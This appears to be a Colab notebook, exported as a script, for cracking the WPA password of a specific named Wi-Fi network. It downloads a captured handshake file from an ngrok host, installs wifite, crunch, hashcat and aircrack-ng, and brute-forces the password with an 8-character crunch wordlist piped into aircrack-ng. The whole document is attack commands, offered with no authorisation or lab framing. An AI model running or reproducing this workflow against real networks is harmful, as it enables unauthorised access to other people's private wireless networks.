# %% [markdown]
# <a href="https://colab.research.google.com/github/AaryanBansal-dev/rdp/blob/main/Cracking_wifi.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %%
# !wget https://c83973bd91ef.ngrok-free.app/handshake_PareekAIR_54-37-BB-B6-3D-19_2025-11-05T22-03-26.cap -P /content

# %%
# !apt-get update
# !apt-get install -y wifite crunch

# %%
# !apt-get install -y hashcat

# %%
# !apt-get install -y aircrack-ng

# %%
# !crunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\$#@&% -o /content/wordlist.txt | aircrack-ng /content/handshake_PareekAIR_54-37-BB-B6-3D-19_2025-11-05T22-03-26.cap -w /content/wordlist.txt

# %%
# !aircrack-ng /content/handshake_PareekAIR_54-37-BB-B6-3D-19_2025-11-05T22-03-26.cap -w /content/wordlist.txt
